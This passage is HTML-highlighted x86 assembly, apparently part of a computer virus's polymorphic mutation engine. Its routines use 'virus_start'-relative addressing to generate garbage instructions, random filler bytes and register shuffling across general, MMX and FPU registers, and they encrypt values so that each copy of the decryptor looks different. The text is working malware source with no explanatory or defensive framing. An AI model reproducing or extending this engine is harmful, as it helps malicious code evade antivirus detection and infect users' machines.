        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_oper</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;is it MOV ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_me_move</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_add_sub</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_me_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_me_move</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_tofrom</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_me_move_from</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_movin</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_me_finish</span><span class="sc0">
    </span><span class="sc5">__ppe_me_move_from</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_movout</span><span class="sc0">

    </span><span class="sc5">__ppe_me_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; save the memory place where we're for the future calculate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">

        </span><span class="sc1">; now, we will generate add-sub for Copro</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; I must get a empty place in memory to save reg32 there</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_tofrom</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_me_noreg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_reg2mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_in_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">__ppe_me_noreg</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; and now - put iluzo-reg32 to copro-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_in_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_oper</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_me_nosub</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppe_me_nosub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_oper</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_me_move_2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_math</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_me_finish_2</span><span class="sc0">
    </span><span class="sc5">__ppe_me_move_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_tofrom</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_me_move_from_2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_movin</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_movin</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_me_finish_2</span><span class="sc0">
    </span><span class="sc5">__ppe_me_move_from_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_me_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_mov2reg</span><span class="sc0">

    </span><span class="sc5">__ppe_me_finish_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; set jump from MMX behind Copro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;EDI from Copro</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">;jmp..</span><span class="sc0">

</span><span class="sc5">a_math_extended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to put base-reg32 to memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:        AH=reg32</span><span class="sc0">
        </span><span class="sc1">;output:      EDX=place in memory</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_mc_reg32</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">__ppe_mc_memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_reg2mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_mc_reg32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; save used_regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_mc_reg32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; select place in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_get_mem</span><span class="sc0">     </span><span class="sc1">;EDX is output</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_mc_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">__ppe_r2m_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppe_r2m_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; it's time for save reg32 to memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_mc_reg32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;mov [empty_reg32], reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; enable register</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_mc_memory</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for write insignificant data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_gen_rnd_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ppe_gen_rnd_fill</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;far JMP's five bytes - 1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_buffer</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_loop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ functions returns (empty) base/mmx/copro reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_reg</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_empty_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_STACK</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_copro</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ppe_get_empty_reg_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs_mmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ppe_get_empty_reg_mmx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__reg_to_bcd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs_bcd</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to detect/set an empty reg from base/copro/mmx ÃÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc1">; output: AH=reg, AL=type</span><span class="sc0">
</span><span class="sc5">ppe_get_valid_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__ppes_new_reg_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_new_reg_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copro_or_mmx</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc5">__ppes_new_reg_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_new_reg_extended</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_STACK</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_new_reg_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppes_new_reg_finish</span><span class="sc0">
    </span><span class="sc5">__ppes_new_reg_extended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_new_reg_extended_mmx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppes_new_reg_finish</span><span class="sc0">
    </span><span class="sc5">__ppes_new_reg_extended_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_mmx</span><span class="sc0">
    </span><span class="sc5">__ppes_new_reg_finish</span><span class="sc4">:</span><span class="sc0">
